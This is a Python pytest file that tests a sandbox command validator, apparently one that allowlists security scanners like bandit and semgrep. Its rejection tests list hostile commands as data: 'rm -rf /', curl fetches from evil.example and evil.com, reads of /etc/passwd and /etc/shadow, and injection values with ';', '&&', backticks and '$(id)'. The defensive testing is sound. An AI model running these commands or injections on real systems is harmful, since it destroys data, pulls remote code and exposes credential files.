"""The allowlist must make dangerous commands impossible, not merely discouraged."""

from __future__ import annotations

import pytest

from quorum.tools.sandbox import CommandRejected, validate_command


class TestRejected:
    @pytest.mark.parametrize(
        "cmd",
        [
            "rm -rf /",
            "curl https://evil.example/x.sh",
            "python -c pwn",
            "git push --force",
            "cat /etc/passwd",
        ],
    )
    def test_commands_off_the_allowlist(self, cmd):
        with pytest.raises(CommandRejected, match="not allowed"):
            validate_command(cmd)

    @pytest.mark.parametrize(
        "cmd",
        [
            "bandit x; rm -rf /",
            "bandit x && curl evil.com",
            "bandit x | tee /etc/passwd",
            "bandit `whoami`",
            "bandit $(id)",
            "bandit x > /etc/hosts",
            "bandit x < /etc/shadow",
            "bandit x\nrm -rf /",
        ],
    )
    def test_shell_metacharacters(self, cmd):
        with pytest.raises(CommandRejected, match="metacharacters"):
            validate_command(cmd)

    @pytest.mark.parametrize("cmd", ["./bandit x", "/tmp/bandit x", "../bin/bandit x"])
    def test_path_qualified_lookalikes(self, cmd):
        with pytest.raises(CommandRejected, match="bare command name"):
            validate_command(cmd)

    @pytest.mark.parametrize("cmd", ["", "   "])
    def test_empty(self, cmd):
        with pytest.raises(CommandRejected, match="Empty"):
            validate_command(cmd)

    def test_unbalanced_quotes(self):
        with pytest.raises(CommandRejected):
            validate_command("bandit 'unclosed")


class TestAccepted:
    @pytest.mark.parametrize(
        "cmd,expected",
        [
            ("bandit -ll /pr/app.py", ["bandit", "-ll", "/pr/app.py"]),
            (
                "semgrep --config auto /pr/x.py",
                ["semgrep", "--config", "auto", "/pr/x.py"],
            ),
            ("bandit -f json -ll /pr/a.py", ["bandit", "-f", "json", "-ll", "/pr/a.py"]),
        ],
    )
    def test_scanner_invocations(self, cmd, expected):
        assert validate_command(cmd) == expected
